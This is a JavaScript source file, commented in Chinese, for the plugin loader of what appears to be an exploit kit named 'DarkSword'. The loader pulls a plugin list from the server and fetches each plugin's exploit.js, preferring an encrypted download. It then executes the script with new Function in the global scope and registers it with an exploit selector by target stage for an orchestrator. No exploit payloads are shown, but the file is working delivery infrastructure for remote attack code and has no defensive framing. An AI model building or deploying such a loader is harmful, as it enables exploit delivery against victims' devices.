/**
 * DarkSword 插件化加载系统
 *
 * 职责:
 * - 从服务端 /api/plugins/list 获取已注册插件清单
 * - 动态加载插件 exploit.js 并执行注册
 * - 向 ExploitSelector 注册插件元数据
 * - 维护插件状态（启用/禁用/加载失败）
 */

'use strict';

class PluginLoader {
  constructor() {
    this.plugins = new Map(); // id → { manifest, status, error? }
    this.listEndpoint = '/api/plugins/list';
    this.loaded = false;
  }

  /**
   * 从服务端获取插件清单并批量加载
   */
  async loadAll() {
    try {
      const res = await fetch(this.listEndpoint);
      if (!res.ok) {
        console.warn('[PluginLoader] Failed to fetch plugin list:', res.status);
        return;
      }

      const data = await res.json();
      const manifests = data.plugins || [];

      console.log(`[PluginLoader] Discovered ${manifests.length} plugins`);

      for (const manifest of manifests) {
        await this.loadPlugin(manifest);
      }

      this.loaded = true;
      console.log(`[PluginLoader] All plugins processed. Loaded: ${this.getLoadedCount()}/${manifests.length}`);
    } catch (e) {
      console.error('[PluginLoader] loadAll failed:', e.message);
    }
  }

  /**
   * 加载单个插件
   */
  async loadPlugin(manifest) {
    const id = manifest.id;
    if (!id) {
      console.warn('[PluginLoader] Plugin manifest missing id, skipping');
      return false;
    }

    if (this.plugins.has(id)) {
      console.warn(`[PluginLoader] Plugin ${id} already loaded, skipping`);
      return false;
    }

    // 检查是否被禁用
    if (manifest.enabled === false) {
      this.plugins.set(id, { manifest, status: 'disabled' });
      console.log(`[PluginLoader] Plugin ${id} is disabled, skipping load`);
      return false;
    }

    try {
      // 加载 exploit.js
      const scriptPath = manifest._scriptPath || `/plugins/${id}/exploit.js`;
      const code = await this.fetchScript(scriptPath);

      if (!code) {
        throw new Error('Empty script response');
      }

      // 执行脚本（注入全局作用域）
      const scriptFn = new Function(code);
      scriptFn();

      // 验证入口函数存在
      if (manifest.entryFunction && typeof window[manifest.entryFunction] !== 'function') {
        throw new Error(`Entry function '${manifest.entryFunction}' not found after load`);
      }

      // 向 ExploitSelector 注册
      if (window.exploitSelector) {
        const registryEntry = { ...manifest };
        delete registryEntry._scriptPath;
        delete registryEntry.enabled;
        delete registryEntry.entryFunction;
        delete registryEntry.description;
        // 保留 path 为插件脚本路径
        registryEntry.path = scriptPath;
        window.exploitSelector.registerCandidate(registryEntry);
      }

      this.plugins.set(id, { manifest, status: 'loaded' });
      console.log(`[PluginLoader] ✓ Plugin ${id} loaded successfully`);
      return true;

    } catch (e) {
      this.plugins.set(id, { manifest, status: 'error', error: e.message });
      console.error(`[PluginLoader] ✗ Plugin ${id} failed to load:`, e.message);
      return false;
    }
  }

  /**
   * 获取插件脚本内容
   */
  async fetchScript(scriptPath) {
    // 优先用加密模式
    if (typeof getJSAsync === 'function') {
      return await getJSAsync(scriptPath);
    }
    if (typeof getJS === 'function') {
      return getJS(scriptPath);
    }
    // fallback: fetch
    const res = await fetch(scriptPath);
    if (!res.ok) return null;
    return await res.text();
  }

  /**
   * 获取插件入口函数（供 orchestrator 使用）
   */
  getEntryFunction(exploitId) {
    const plugin = this.plugins.get(exploitId);
    if (!plugin || plugin.status !== 'loaded') return null;

    const fnName = plugin.manifest.entryFunction;
    if (!fnName) return null;

    return typeof window[fnName] === 'function' ? window[fnName] : null;
  }

  /**
   * 获取已加载插件数量
   */
  getLoadedCount() {
    let count = 0;
    for (const [, p] of this.plugins) {
      if (p.status === 'loaded') count++;
    }
    return count;
  }

  /**
   * 获取所有插件状态
   */
  getStatus() {
    const result = [];
    for (const [id, p] of this.plugins) {
      result.push({
        id,
        status: p.status,
        targetStage: p.manifest.targetStage,
        error: p.error || null
      });
    }
    return result;
  }

  /**
   * 运行时禁用某插件（从 selector 中移除）
   */
  disablePlugin(pluginId) {
    const plugin = this.plugins.get(pluginId);
    if (!plugin) return false;

    plugin.status = 'disabled';

    // 从 selector candidates 中移除
    if (window.exploitSelector) {
      window.exploitSelector.candidates = window.exploitSelector.candidates.filter(
        c => c.id !== pluginId
      );
    }

    console.log(`[PluginLoader] Plugin ${pluginId} disabled`);
    return true;
  }

  /**
   * 运行时重新启用某插件
   */
  async enablePlugin(pluginId) {
    const plugin = this.plugins.get(pluginId);
    if (!plugin) return false;

    this.plugins.delete(pluginId);
    return await this.loadPlugin(plugin.manifest);
  }
}

// 全局实例
if (typeof window !== 'undefined') {
  window.PluginLoader = PluginLoader;
  window.pluginLoader = new PluginLoader();
  console.log('[PluginLoader] Global instance created');
}